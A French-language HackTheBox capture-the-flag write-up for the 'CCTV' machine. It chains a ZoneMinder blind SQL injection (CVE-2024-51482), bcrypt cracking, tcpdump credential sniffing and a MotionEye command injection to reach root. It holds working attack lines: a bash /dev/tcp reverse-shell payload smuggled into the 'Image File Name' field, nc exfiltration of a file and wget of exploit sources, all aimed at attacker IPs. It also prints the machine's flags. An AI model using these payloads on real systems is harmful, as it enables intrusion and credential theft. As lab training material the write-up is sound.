# Write-up -- HackTheBox : CCTV

Write-up réalisé pour la machine CCTV de HackTheBox. La chaîne d'exploitation enchaîne une injection SQL aveugle (CVE-2024-51482) sur ZoneMinder pour extraire des hashes de mots de passe, un crack bcrypt pour obtenir un accès SSH, une énumération de capabilities Linux révélant `tcpdump`, un sniffing réseau sur un bridge Docker pour intercepter des credentials, et enfin un RCE via une vulnérabilité dans MotionEye pour obtenir un shell root.

L'IP de la machine pendant ma session était `10.129.244.156`.

---

## Étape 1 -- Scan des ports ouverts

```bash
nmap -sC -sV -sS 10.129.244.156
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58
|_http-title: Did not follow redirect to http://cctv.htb/
```

**2 ports TCP ouverts** : SSH sur le 22 et HTTP sur le 80. Le serveur redirige vers `cctv.htb`, qu'on ajoute à `/etc/hosts` :

```bash
sudo nano /etc/hosts
# 10.129.244.156  cctv.htb
```

On arrive sur un site de sécurité.

---

## Étape 2 -- Découverte de ZoneMinder et identification de la CVE

On commence par énumérer les répertoires avec gobuster :

```bash
gobuster dir -u http://cctv.htb/ -w /usr/share/wordlists/dirb/common.txt
```

```
.hta                 (Status: 403) [Size: 273]
.htaccess            (Status: 403) [Size: 273]
index.html           (Status: 200) [Size: 6177]
javascript           (Status: 301) [Size: 309] [--> http://cctv.htb/javascript/]
server-status        (Status: 403) [Size: 273]
```

Rien d'intéressant dans les résultats, mais on remarque directement sur la page d'accueil un bouton **"Staff Login"**. En cliquant dessus, on arrive sur une page de login **ZoneMinder**, un logiciel open-source de surveillance CCTV.

Une recherche rapide sur cette application révèle la **CVE-2024-51482**, une injection SQL aveugle authentifiée sur ZoneMinder. Un exploit est disponible sur GitHub : https://github.com/BridgerAlderson/CVE-2024-51482.

Encore faut-il des identifiants valides pour l'exploiter.

---

## Étape 3 -- Accès à ZoneMinder et confirmation de la vulnérabilité

On tente les credentials par défaut `admin:admin` et... ça passe du premier coup.

On arrive sur le **dashboard admin de ZoneMinder version 1.37.63**, bien vulnérable à la CVE. On clone le dépôt et on vérifie la vulnérabilité :

```bash
python3 exploit.py -i cctv.htb -u admin -p admin --test
```

```
[*] CVE-2024-51482 - ZoneMinder Blind SQL Injection Exploit
[*] Target: cctv.htb

[*] Logging in as 'admin' on cctv.htb...
[+] Login successful
[*] Measuring baseline response time...
[*] Baseline median: 0.038s
[*] Testing vulnerability with 2s sleep...
[*] Response time: 2.19s
[+] Target is vulnerable!
```

---

## Étape 4 -- Exploitation de CVE-2024-51482 : dump des hashes

On commence par énumérer les bases de données :

```bash
python3 exploit.py -i cctv.htb -u admin -p admin --discover --debug
```

```
information_schema
performance_schema
zm
```

On liste ensuite les tables de la base `zm`, mais l'opération est très longue car l'injection aveugle teste lettre par lettre. On saute directement au dump des colonnes de la table `Users` :

```bash
python3 exploit.py -i cctv.htb -u admin -p admin --users --debug
```

```
APIEnabled  Control  Devices  Email  Enabled  Events  Groups
HomeView  Id  MaxBandwidth  Monitors  Name  Password  Phone
Snapshots  Stream  System  TokenMinExpiry  Username
```

On dump les données utiles :

```bash
python3 exploit.py -i cctv.htb -u admin -p admin --dump zm Users "Id,Username,Password"
```

```
{'Id':'3', 'Username':'admin',      'Password': '$2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm'}
{'Id':'2', 'Username':'mark',       'Password': '$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.'}
{'Id':'1', 'Username':'superadmin', 'Password': '$2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m'}
```

Trois comptes, trois hashes **bcrypt**.

---

## Étape 5 -- Crack des hashes avec John The Ripper

On tente de cracker le hash de `mark` :

```bash
john -w=/usr/share/wordlists/rockyou.txt --format=bcrypt hash.txt
```

```
opensesame       (?)
1g 0:00:01:03 DONE (2026-05-02 18:12)
Session completed.
```

Le mot de passe de `mark` est **`opensesame`**. On essaie directement en SSH :

```bash
ssh mark@10.129.244.156
# Password: opensesame
```

Connexion réussie. On est connecté en tant que `mark`.

---

## Étape 6 -- Énumération locale avec LinPEAS

L'utilisateur `mark` a peu de permissions. On télécharge et exécute LinPEAS pour identifier des vecteurs d'escalade :

```bash
# Sur l'attaquant
python3 -m http.server 8000

# Sur mark dans /tmp
wget http://10.10.14.214:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

LinPEAS met en avant un vecteur potentiel : des **capabilities** accordées à certains binaires, notamment `snap-confine` et `tcpdump` :

```
/usr/lib/snapd/snap-confine  cap_chown,cap_dac_override,...,cap_sys_admin=p
/usr/bin/tcpdump              cap_net_raw=eip
```

---

## Étape 7 -- Fausse piste : CVE-2026-3888 sur snap-confine

La présence des capabilities sur `snap-confine` est intrigante. On vérifie la version de snap :

```bash
snap version
```

```
snap    2.73+ubuntu24.04
snapd   2.73+ubuntu24.04
```

Une recherche sur "cve escalade snap 2.73" révèle la **CVE-2026-3888**, avec un exploit disponible sur GitHub : https://github.com/TheCyberGeek/CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE.

On opte pour la variante "Capabilities". On transfère les sources et on compile :

```bash
# Sur mark dans /tmp
wget http://10.10.14.214:8000/exploit_caps.c
wget http://10.10.14.214:8000/librootshell_caps.c

gcc -O2 -static -o exploit exploit_caps.c
gcc -shared -fPIC -nostartfiles -o librootshell.so librootshell_caps.c
```

Après plusieurs tentatives, l'exploit échoue. L'exploit requiert `unshare()` pour entrer dans un user namespace et accéder au mount namespace de `snap-confine`, capacité non disponible ici. La piste `snap-confine` est un cul-de-sac.

---

## Étape 8 -- Sniffing réseau via tcpdump

On revient sur la capability `cap_net_raw` accordée à `tcpdump`. En inspectant les interfaces réseau, on remarque plusieurs **bridges Docker** actifs :

```bash
ip addr show
```

```
br-1b6b4b93c636  inet 172.25.0.1/16
br-3e74116c4022  inet 172.18.0.1/16
docker0          inet 172.17.0.1/16
```

On sniffe les deux bridges en filtrant sur les mots-clés sensibles. Sur `br-3e74116c4022`, rien d'intéressant. Sur `br-1b6b4b93c636`, en revanche :

```bash
tcpdump -i br-1b6b4b93c636 -A -s 0 2>/dev/null | grep -i "pass\|user\|auth\|POST\|token"
```

```
z./....sUSERNAME=sa_mark;PASSWORD=X1l9fx1ZjS7RZb;CMD=disk-info
z.....0.USERNAME=sa_mark;PASSWORD=X1l9fx1ZjS7RZb;CMD=status
...
```

Des credentials en clair transitent en boucle sur ce bridge. On récupère **`sa_mark:X1l9fx1ZjS7RZb`**.

---

## Étape 9 -- Flag user

On passe sur le compte `sa_mark` :

```bash
su sa_mark
# Password: X1l9fx1ZjS7RZb
```

```bash
cd /home/sa_mark
ls
# 'SecureVision Staff Announcement.pdf'   user.txt
cat user.txt
```

**Flag user :** `4353dc04b65542010dd34d343fe842b6`

---

## Étape 10 -- Fausse piste : exploration du PDF et découverte de MotionEye

On exfiltre le fichier PDF vers notre machine pour l'analyser :

```bash
# Sur sa_mark
nc 10.10.14.214 8000 < 'SecureVision Staff Announcement.pdf'
```

Le document annonce la migration vers ZoneMinder et précise que les credentials du staff resteront les mêmes : rien d'exploitable directement.

En fouillant le système, on découvre que **MotionEye** est également déployé. Le fichier `/etc/motioneye/motioneye.conf` révèle qu'il écoute sur `127.0.0.1:8765`. Le fichier `motion.conf` contient des credentials :

```
# @admin_username admin
# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0
```

On met en place un tunnel SSH pour accéder à l'interface :

```bash
ssh -L 8765:127.0.0.1:8765 mark@10.129.244.156
```

On se connecte sur `localhost:8765`. La version trouvée est **MotionEye 0.43.1b4**.

---

## Étape 11 -- RCE via MotionEye et escalade root

Une recherche sur les vulnérabilités de MotionEye 0.43.1b4 mène vers un exploit RCE disponible sur https://npulse.net/en/exploits/52481. L'injection de commandes se fait via le champ **"Image File Name"** de la configuration, à condition de déverrouiller préalablement la validation côté client.

On reproduit l'exploit :

**1.** Ouvrir les DevTools du navigateur et dans la console, désactiver la validation du formulaire :
```javascript
configUiValid = function() { return true; };
```

**2.** Tester l'injection avec les options `Capture mode: Interval Snapshots` et `Snapshot Interval: 10 seconds` :
```
$(touch /tmp/test).%Y-%m-%d-%H-%M-%S
```

Le fichier est bien créé. L'injection fonctionne.

**3.** On lance un listener sur notre machine :
```bash
nc -lvnp 8000
```

**4.** On injecte un reverse shell dans le champ "Image File Name" :
```
$(python3 -c "import os;os.system('bash -c \"bash -i >& /dev/tcp/10.10.14.193/8000 0>&1\"')")%Y-%m-%d/%H-%M-%S
```

On obtient un shell **root** en retour.

---

## Étape 12 -- Flag root

```bash
root@cctv:/etc/motioneye# cat /root/root.txt
```

**Flag root :** `f0325e671a60d0beefca2a24cbc720d4`
